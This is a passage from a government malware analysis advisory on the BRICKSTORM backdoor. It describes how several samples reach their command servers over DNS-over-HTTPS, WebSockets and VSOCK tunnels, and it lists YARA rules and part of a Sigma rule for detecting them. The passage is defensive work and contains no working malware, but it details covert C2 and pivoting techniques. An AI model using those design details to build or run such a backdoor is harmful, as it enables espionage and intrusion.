\nSee Figure 7 for the Command Handler decompiler output. \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 19 of 48 TLP:CLEAR \n \nFigure 7. Command Handler Decompiler Output \nSamples 2 Through 6 \nInitial Connection to the C2 Server: Like Sample 1, these samples create an encrypted DNS query for hard-\ncoded C2 domains (redacted) and use DoH to resolve the addresses of their C2 servers by sending an \nencrypted HTTPS request to one of the following legitimate public DoH resolvers: \n\u25aa https[:]//1.0.0[.]1/dns-query (Cloudflare) \n\u25aa https[:]//1.1.1[.]1/dns-query (Cloudflare) \n\u25aa https[:]//149.112.112[.]11/dns-query (Quad9) \n\u25aa https[:]//45.90.28.160/dns-query (NextDNS) \n\nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 20 of 48 TLP:CLEAR \n\u25aa https[:]//8.8.4[.]4/dns-query (Google) \n\u25aa https[:]//8.8.8[.]8/dns-query (Google) \n\u25aa https[:]//9.9.9[.]11/dns-query (Quad9) \n\u25aa https[:]//9.9.9[.]9/dns-query (Quad9) \nNote: Some of these samples use XOR encryption to decrypt IPv4 addresses for DoH servers. \nEstablishing Secure Communications: Like Sample 1, these samples establish WebSocket Secure (WSS) \nconnections with the C2 server and set up a multiplexing layer. \nFull System Control: Once the connection is established with the C2 server via WebSockets, these \nBRICKSTORM samples receive commands that are directed to one of four specific handlers to perform \ntasks on the compromised system: SOCKS Handler, Web Service Handler, Command Handler, or \nCommandNoContext Handler. The SOCKS, Web Service, and Command Handlers function similar to the \nSample 1 handlers. The CommandNoContext Handler executes shell commands on the compromised \nsystem without using an explicit security context. \nSample 7 \nInitial Connection to the C2 Server: Sample 7 retrieves configuration parameters from environment \nvariables, performs checks, generates a TLS configuration used for secure communication to \nBRICKSTORM\u2019s client, and starts a network communications routine. This sample also uses a VSOCK \ninterface to enable inter-VM communication, support data exfiltration, and maintain persistence in \nvirtualized environments.  \nUpon execution, Sample 7 retrieves the following three configuration values from environment variables \nusing the os_Getenv function: \n\u25aa listenAddr (listen address and port) \n\u25aa listenPath (listen path to route requests to the WSS connection) \n\u25aa password (authentication key) \nEstablishing Secure Communications: Sample 7 establishes a secure WebSocket server with minimal \nexternal dependencies; specifically, all communication is encrypted using in-memory self-signed \ncertificates. This enables encrypted communication without relying on publicly trusted Certificate \nAuthorities (CAs) or storing certificate files on disk. It dynamically generates a self-signed X.509 certificate \nand a corresponding 2048-bit Rivest\u2013Shamir\u2013Adleman (RSA) private key in memory, which are loaded into \na tls.Certificate struct and assigned to the certificate field\u2019s tls.Config object. This allows the \nserver to handle HTTPS/WSS connections using the in-memory self-signed certificate, as standard \nNET/HTTP servers are configured to use tls.Config. \nSample 7 uses a single, multiplexed connection over secure WebSockets to communicate with a specified \nC2 address (retrieved from the listenAddr value) and path (retrieved from the listenPath value). \nDuring or before the WSS handshake, Sample 7 implements a custom authentication check, involving the \nspecific pre-shared authentication key (retrieved from password value). \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 21 of 48 TLP:CLEAR \nFull System Control: Once the WSS connection with the C2 server is established, Sample 7 processes \nincoming commands through one of four handlers: Web Service Handler, Command Handler, VSOCK-proxy \nhandler, or VSOCK handler. \nThe Web Service Handler functions similar to Sample 1\u2019s Web Service Handler. \nThe Command Handler functions similar to Sample 1\u2019s Command Handler. \nThe VSOCK-proxy Handler performs VSOCK relaying and network tunneling. It implements a proxy with \nspecific configuration arguments to establish a tunneled connection to process JSON payloads. First, the \nhandler unmarshals the payload data and extracts and validates the TunnelAddr, Context ID (CID), \nPort, and Family configuration arguments. Based on the validated arguments, the handler binds to a \nspecific VSOCK address (defined by the CID and port) and establishes a connection to the destination \nspecified by TunnelAddr. When the connection is completed or terminated, the handler sends an \nappropriate success or error response back to the client. This functionality enables cyber actors to \nmaintain covert communication channels, evade detection, and pivot within virtualized environments. \nThe VSOCK Connection Handler creates and connects to VSOCK endpoints to maintain covert connections \nwithin the virtual environment. It processes incoming network requests containing a JSON payload with \nspecific configuration arguments for connecting to a VSOCK endpoint. The handler extracts the JSON \npayload from the request and uses a JSON parser to unmarshal the data into a structured object with fields \nfor Context (CID), Port, and Family. The handler checks the unmarshalled data for validity and, if the \nconfiguration is valid, the handler establishes a connection to a VSOCK endpoint using a specified CID and \nport number. If the virtual socket creation is successful, the handler allocates a new runtime object to hold \nthe CID and port information. If unmarshalling fails, validation fails, or the destination connection cannot \nbe established, the handler returns an appropriate error to the client. \nSample 8 \nLike Sample 7, Sample 8: \n\u25aa Retrieves C2 parameters (listenAddr, listenPath, and password) from environment variables, \n\u25aa Uses a self-signed X.509 certificate and a corresponding 2048-bit RSA private key in memory to \nfacilitate encrypted communications without relying on a CA, \n\u25aa Establishes a secure WebSocket server for encrypted communication, and \n\u25aa Directs commands to specific handlers. \nSample 8\u2019s handlers directing commands differ from Sample 7. In addition to a Web Service Handler, \nCommand Handler, VSOCK-proxy Handler, and VSOCK Connection Handler, Sample 8 also has two \nadditional handlers: The SOCKS Handler (which functions similar to Sample 1\u2019s SOCKS Handler) and the \nCommandNoContext Handler (which functions similar to Samples 2 through 6\u2019s CommandNoContext \nHandler). \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 22 of 48 TLP:CLEAR \nDetection \nYARA Rules \nDeploy the CISA-created YARA rules in Table 12 to detect malicious activity. See Appendix B: Scanning \nGuidance on Remote Hosts for guidance on how to identify activity with these rules.  \nTable 12. YARA Rules \nBRICKSTORM Rule 1 \nrule CISA_251165_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251165\" \ndate = \"2025-09-29\" \nlast_modified = \"202051001_1008\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"aaf5569c8e349c15028bc3fac09eb982efb06eabac955b705a6d447263658e38\" \nstrings: \n$s0 = { 6D 61 69 6E 2E 73 74 61 72 74 4E 65 77 } \n$s1 = { 6D 61 69 6E 2E 73 65 6C 66 57 61 74 63 68 65 72 } \n$s2 = { 6D 61 69 6E 2E 73 65 74 53 65 72 76 69 63 65 43 66 67 } \n$s3 = { 73 6F 63 6B 73 2E 48 61 6E 64 6C 65 53 6F 63 6B 73 52 65 71 75 65 73 74 } \n$s4 = { 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 } \n$s5 = { 63 6F 6D 6D 61 6E 64 2E 48 61 6E 64 6C 65 54 54 59 52 65 71 75 65 73 74 } \n$s6 = { 77 65 62 73 6F 63 6B 65 74 2E 28 2A 57 53 43 6F 6E 6E 65 63 74 6F 72 29 2E 43 6F 6E \n6E 65 63 74 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 23 of 48 TLP:CLEAR \n$s7 = { 66 73 2E 28 2A 57 65 62 53 65 72 76 65 72 29 2E 52 75 6E 53 65 72 76 65 72 } \n$s8 = { 68 74 74 70 73 3A 2F 2F 31 2E 30 2E 30 2E 31 2F 64 6E 73 2D 71 75 65 72 79 } \n$s9 = { 68 74 74 70 73 3A 2F 2F 31 2E 31 2E 31 2E 31 2F 64 6E 73 2D 71 75 65 72 79 } \n$s10 = { 68 74 74 70 73 3A 2F 2F 38 2E 38 2E 34 2E 34 2F 64 6E 73 2D 71 75 65 72 79 } \n$s11 = { 68 74 74 70 73 3A 2F 2F 38 2E 38 2E 38 2E 38 2F 64 6E 73 2D 71 75 65 72 79 } \n$s12 = { 68 74 74 70 73 3A 2F 2F 39 2E 39 2E 39 2E 39 2F 64 6E 73 2D 71 75 65 72 79 } \ncondition: \n8 of them \n} \nBRICKSTORM Rule 2 \nrule CISA_251155_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"320a0b5d4900697e125cebb5ff03dee7368f8f087db1c1570b0b62f5a986d759\" \nsha256_1 = \"dfac2542a0ee65c474b91d3b352540a24f4e223f1b808b741cfe680263f0ee44\" \nsha256_1 = \"b91881cb1aa861138f2063ec130b2b01a8aaf0e3f04921e5cbfc61b09024bf12\" \nsha256_1 = \"bfb3ffd46b21b2281374cd60bc756fe2dcc32486dcc156c9bd98f24101145454\" \nstrings: \n$s0 = { 04 30 0F B6 54 04 2C 31 D1 88 4C 04 34 48 FF C0 } \n$s1 = { 48 83 F8 04 7C E7 48 C7 04 24 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 24 of 48 TLP:CLEAR \n$s2 = { 48 8D 44 24 34 48 89 44 24 08 48 C7 44 24 10 04 } \n$s3 = { 48 89 44 24 48 48 89 4C 24 50 48 8B 6C 24 38 48 } \n$s4 = { 48 83 EC 40 48 89 6C 24 38 48 8D 6C 24 38 C7 44 24 } \n$s5 = { 83 EC 38 48 89 6C 24 30 48 8D 6C 24 30 C6 44 24 } \n$s6 = { 4C 24 20 48 89 44 24 40 48 89 4C 24 48 48 8B 6C } \n$s7 = { 64 48 8B 0C 25 F8 FF FF FF 48 3B 61 10 0F 86 81 } \n$s8 = { 64 48 8B 0C 25 F8 FF FF FF 48 3B 61 10 0F 86 91 } \ncondition: \nall of them \n} \nBRICKSTORM Rule 3 (Added Dec. 19, 2025) \nrule CISA_251155_01 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"2bf9bfa1f9bcbcad0eada7e3be8d380d809248f08609f6e9d971b37ce09f7e93\" \nsha256_2 = \"6d42e9a0757670b9837034b5202d1673093577757b44bb0f0253f366413393e9\" \nsha256_3 = \"b30041b986ee3231fd53522c9d0c57e4567d6c60959fa06c125dde2af558fc9f\" \nstrings: \n$s0 = { 88 14 08 48 FF C1 } \n$s1 = { 2F 63 6F 72 65 2F 74 61 73 6B 2E 44 6F 54 61 73 6B 2E 66 75 6E 63 31 } \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 25 of 48 TLP:CLEAR \n$s2 = { 2F 63 6F 72 65 2F 74 61 73 6B 2E 44 6F 54 61 73 6B 2E 66 75 6E 63 31 2E 32 } \n$s3 = { 2F 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 \n} \n$s4 = { 2F 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 77 65 62 2E 57 65 62 53 65 72 76 69 63 65 \n2E 66 75 6E 63 31 } \n$s5 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 73 6F 63 6B 73 2E 53 6F 63 6B 73 } \n$s6 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 73 6F 63 6B 73 2E 53 6F 63 6B 73 2E 66 75 6E \n63 31 } \n$s7 = { 63 6F 72 65 2F 65 78 74 65 6E 64 73 2F 63 6F 6D 6D 61 6E 64 2E 43 6F 6D 6D 61 6E 64 \n} \n$s8 = { 6C 69 62 73 2F 64 6F 68 2E 51 75 65 72 79 } \n$s9 = { 2F 76 65 6E 64 6F 72 2F 68 61 73 68 69 63 6F 72 70 2F 79 61 6D 75 78 2E 53 65 72 76 \n65 72 } \ncondition: \n3 of them \n} \nRule 4 (Rust-based Samples) (Added Dec. 19, 2025) \nrule CISA_251217_03 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251217\" \ndate = \"2025-12-10\" \nlast_modified = \"20251216_729\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Rust BRICKSTORM backdoor samples\" \nsha256_1 = \"6a67a9769a55ec889a5dd4199b2fc08965d39d737838836853bc13c81c56a800\" \nsha256_2 = \"ed907d39efd5750236b075ca9fbb1f090d7bf578578c38faab24210d298a60ae\"  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 26 of 48 TLP:CLEAR \nsha256_3 = \"0e92009fc6519c837982b3fbfd42946e827de47b73a264d693739168533d07f4\" \nsha256_4 = \"fb22eea57e00b83edad50ee6e02320377efc10586584c476d5018dbba3643c32\" \nsha256_5 = \"28a16e782f04d9394b5dfa3363d41d9f5eecc206166aeffd73363d83734a026d\" \nstrings: \n$s0 = { 20 55 70 67 72 61 64 65 3A 20 77 65 62 73 6F 63 6B 65 74 43 6F 6E 6E 65 63 74 69 6F \n6E 3A } \n$s1 = { 20 55 70 67 72 61 64 65 53 65 63 2D 57 65 62 73 6F 63 6B 65 74 2D 4B 65 79 3A } \n$s2 = { 20 53 65 63 2D 57 65 62 53 6F 63 6B 65 74 2D 56 65 72 73 69 6F 6E 3A } \n$s3 = { 57 65 62 53 6F 63 6B 65 74 53 65 63 2D 57 65 62 53 6F 63 6B 65 74 2D 41 63 63 65 \n70 74 3A } \n$s4 = { 53 77 69 74 63 68 69 6E 67 20 50 72 6F 74 6F 63 6F 6C 73 } \n$s5 = { 32 35 38 45 41 46 41 35 2D 45 39 31 34 2D 34 37 44 41 2D 39 35 43 41 2D 43 35 41 \n42 30 44 43 38 \n35 42 31 31 } \n$s6 = { 2F 64 65 76 2F 70 74 6D 78 64 6F 20 66 6F 72 6B 6F 70 65 6E 20 } \n$s7 = { 53 6F 63 6B 73 35 20 63 6D 64 20 6E 6F 74 20 73 75 70 70 6F 72 74 } \n$s8 = { 62 39 32 37 35 38 61 39 61 65 66 31 63 65 66 37 62 37 39 65 32 62 37 32 63 33 64 \n38 62 61 31 31 33 65 35 34 37 66 38 39 } \n$s9 = { 58 34 34 38 52 69 6E 67 47 45 54 20 0D 0A 0D 0A 70 69 70 65 50 69 6E 67 50 6F 6E 67 \n44 61 74 61 } \ncondition: \n9 of them \n} \nRule 5 (Added Jan. 20, 2026) \nrule CISA_251155_03 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251155\" \ndate = \"2025-09-15\" \nlast_modified = \"20250916_1511\" \nactor = \"n/a\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 27 of 48 TLP:CLEAR \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"0cba5c6d16c7b94a450c36bfbaeab79107ac10aa9548b02c42b4b6ba8cef6a51\" \nstrings: \n$s0 = { CE 73 63 44 0F B6 04 30 44 31 C7 48 83 FE 19 72 DA EB 53 48 C7 04 24 } \n$s1 = { 64 48 8B 0C 25 F8 FF FF FF 48 8D 44 24 E8 48 3B } \n$s2 = { 8D 44 24 5F 48 89 04 24 48 8D 05 F9 4C 12 00 48 } \n$s3 = { 8B 4C 24 20 48 89 4C 24 30 48 8D 54 24 58 48 89 } \n$s4 = { 8B 44 24 20 48 89 44 24 30 48 8B 4C 24 18 48 89 } \n$s5 = { E8 8E 6A D5 FF 48 8B 44 24 18 48 89 84 24 98 } \n$s6 = { E8 A4 69 D5 FF 48 8B 44 24 20 48 8B 4C 24 28 48 89 84 24 B0 } \n$s7 = { 48 8D 44 24 3F 48 89 44 24 08 48 C7 44 24 10 19 } \ncondition: \nall of them \n} \nRule 6 (Added Jan. 20, 2026) \nrule CISA_251186_02 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"251186\" \ndate = \"2025-11-17\" \nlast_modified = \"n/a\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 28 of 48 TLP:CLEAR \ntool_type = \"unknown\" \ndescription = \"Detects Go-Based BRICKSTORM backdoor samples\" \nsha256_1 = \"57bd98dbb5a00e54f07ffacda1fea91451a0c0b532cd7d570e98ce2ff741c21d\" \nstrings: \n$s0 = { 31 F7 40 88 7C 04 4C 48 FF C0 } \n$s1 = { 44 01 C7 40 88 7C 14 30 48 FF C2 0F 1F 00 } \n$s2 = { 41 89 F0 31 FE 01 D6 66 90 49 83 F8 11 } \n$s3 = { 48 8B 44 24 08 48 8B 5C 24 10 48 8B 4C 24 18 } \n$s4 = { 48 89 C1 48 89 DF 48 8D 05 0F 6F 15 00} \n$s5 = { 48 8D 3D 9A 6D 15 00 4D 89 C1 49 89 F0 } \n$s6 = { 81 39 49 43 4D 50 74 0C } \n$s7 = { E8 FB E6 FF FF E8 76 D0 FF FF E8 91 C0 FF FF 48 8B 05 EA BF 53 } \ncondition: \nall of them \n} \nRule 7 (Added Feb. 11, 2026) \nrule CISA_261234_01 : BRICKSTORM backdoor installs_other_components communicates_with_c2 \nexfiltrates_data \n{ \nmeta: \nauthor = \"CISA Code & Media Analysis\" \nincident = \"261234\" \ndate = \"2026-02-03\" \nlast_modified = \"20260203_1426\" \nactor = \"n/a\" \nfamily = \"BRICKSTORM\" \ncapabilities = \"installs-other-components communicates-with-c2 exfiltrates-data\" \nmalware_type = \"backdoor\" \ntool_type = \"unknown\" \ndescription = \"Detects AOT BRICKSTORM backdoor samples\" \nsha256_1 = \"24a11a26a2586f4fba7bfe89df2e21a0809ad85069e442da98c37c4add369a0c\" \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 29 of 48 TLP:CLEAR \nstrings: \n$s0 = { 2F 00 75 00 73 00 72 00 2F 00 73 00 62 00 69 00 6E 00 2F 00 73 00 71 00 69 00 75 00 \n64 } \n$s1 = { 2F 00 62 00 69 00 6E 00 2F 00 62 00 61 00 73 00 68 } \n$s2 = { 2F 00 63 00 6D 00 64 00 6C 00 69 00 6E 00 65 } \n$s3 = { 2F 00 64 00 65 00 76 00 2F 00 6E 00 75 00 6C } \n$s4 = { 2F 00 65 00 74 00 63 00 2F 00 73 00 61 00 6D 00 62 00 61 00 2F 00 73 00 6D 00 62 } \n$s5 = { 2F 00 70 00 72 00 6F 00 63 00 2F 00 6E 00 65 00 74 00 2F 00 72 00 6F 00 75 00 74 } \n$s6 = { 44 6F 74 4E 65 74 52 75 6E 74 69 6D 65 44 65 62 75 67 48 65 61 64 65 72 } \n$s7 = { 32 35 38 45 41 46 41 35 2D 45 39 31 34 2D 34 37 44 41 2D 39 35 43 41 2D 43 35 41 \n42 30 44 43 38 35 42 31 31 } \n$s8 = { 63 66 73 65 74 6F 73 70 65 65 64 00 63 68 64 69 72 00 63 6C 6F 73 65 00 64 75 70 32 \n} \n$s9 = { 65 78 65 63 76 00 65 78 65 63 76 70 00 66 6F 72 6B 00 66 6F 72 6B 70 74 79 00 6B 69 \n6C 6C } \n$s10 = { 32 31 35 31 30 31 32 31 33 62 35 63 34 35 34 38 61 62 36 63 63 65 38 31 38 35 34 \n61 31 33 65 65 } \ncondition: \n9 of them \n} \nSigma Rule \nDeploy the CISA-created Sigma rule in Table 13 to detect BRICKSTORM. \nNote: This rule can be run in an entity\u2019s security information and event management (SIEM) system, but it \nwill only be useful if the SIEM contains the vCenter logs. Additionally, this detection method will not work if \nrun on endpoint detection and response (EDR) logs. \nTable 13. Sigma Rule \nBRICKSTORM \n                             ## CISA Code & Media Analysis ## \n                            ############ README ############### \n## Edit rules and queries as needed for your hunt and based on your environment. \n## Ensure your EDR/SIEM instance has enough memory to run these AND/OR condition based queries. May \ntake longer to run than conventional Sigma rule query.  \nBRICKSTORM Backdoor TLP:CLEAR \nCISA | NSA | Cyber Centre \nAR25-338A  \nPage 30 of 48 TLP:CLEAR \n## Do not edit \"logsource-product:\" unless you are editing this rule to meet specific logsources/fields and \nknow your environment. \n## TLP GREEN + Please use local installation of Sigma to convert this rule. \n## TLP CLEAR may convert rules using online converter of choice. \n                            ################################### \ntitle: BRICKSTORM Backdoor Activity r2 \nincident: 251157.r2 \ntlp: CLEAR \nid: 329bec83-54bd-405f-a5ab-ba97ec5e6057 \nstatus: test \ndescription: BRICKSTORM malware is a backdoor with multiple capabilities that threat actors use to set up \npersistence on exploited systems.  \nreferences: \n    - https://cloud.google.com/blog/topics/threat-intelligence/brickstorm-espionage-campaign \n    - https://cloud.google.com/blog/topics/threat-intelligence\n",
    "expected_count": 0
  }
]